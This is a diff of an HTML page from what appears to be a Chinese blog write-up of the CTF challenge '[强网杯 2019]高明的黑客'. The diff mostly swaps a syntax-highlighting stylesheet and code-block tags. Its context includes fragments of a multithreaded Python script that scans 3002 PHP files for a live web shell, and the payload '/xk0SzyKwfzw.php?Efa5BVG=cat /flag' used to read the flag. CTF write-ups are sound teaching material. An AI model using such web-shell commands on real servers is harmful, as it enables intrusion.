@@ -29,7 +29,15 @@
     
     
       
-      <link  rel="stylesheet" href="https://cdn.staticfile.org/highlight.js/10.1.2/styles/atom-one-dark-reasonable.min.css" />
+      
+        
+          
+          
+          
+        
+        <link  rel="stylesheet" href="https://cdn.staticfile.org/prism/1.22.0/themes/prism-funky.min.css" />
+      
+      
     
   
 
@@ -248,7 +256,7 @@
               <h2 id="二十八、"><a href="#二十八、" class="headerlink" title="二十八、"></a>二十八、</h2><h3 id="题目"><a href="#题目" class="headerlink" title="题目"></a>题目</h3><p>[强网杯 2019]高明的黑客<br><img src="https://ae04.alicdn.com/kf/H0c5d474d5be84e36bf49ea28ff95588fv.jpg" srcset="/img/loading.gif" alt="02.png">      </p>
 <h3 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h3><p>访问<code>www.tar.gz</code>得到一个压缩包，里面有3002个PHP文件，<img src="https://ae04.alicdn.com/kf/Hf19fd81889a14126917af7acb6db6830p.jpg" srcset="/img/loading.gif" alt="03.png"><br>有shell，应该是只有一个是有效的吧，所以考的应该是python写脚本的能力了         </p>
 <h3 id="解"><a href="#解" class="headerlink" title="解"></a>解</h3><p><a target="_blank" rel="noopener" href="https://blog.csdn.net/a3320315/article/details/102945940">大佬</a>的脚本      </p>
-<div class="hljs"><pre><code><pre><code class="hljs php">import os
+<pre><code><pre><code class="hljs php">import os
 import requests
 import re
 import threading
@@ -305,7 +313,7 @@ def get_content(file):
 
 <span class="hljs-keyword">for</span> i in files:															<span class="hljs-comment">#加入多线程</span>
    t = threading.Thread(target=get_content, args=(i,))
-   t.start()</code></pre></div></code></pre>
+   t.start()</code></pre></code></pre>
 <p>运行<br><img src="https://sc03.alicdn.com/kf/Hdef4496632754ec3885fb3bc8cfd8668W.jpg" srcset="/img/loading.gif" alt="04.png"><br>payload：<code>/xk0SzyKwfzw.php?Efa5BVG=cat /flag</code>得到flag<img src="https://ae02.alicdn.com/kf/H85c10a4376734c50af5ce78f50a844700.jpg" srcset="/img/loading.gif" alt="01.png"> </p>
 
             </div>
@@ -451,6 +459,8 @@ def get_content(file):
 
 
 
+  
+    
   
 
 
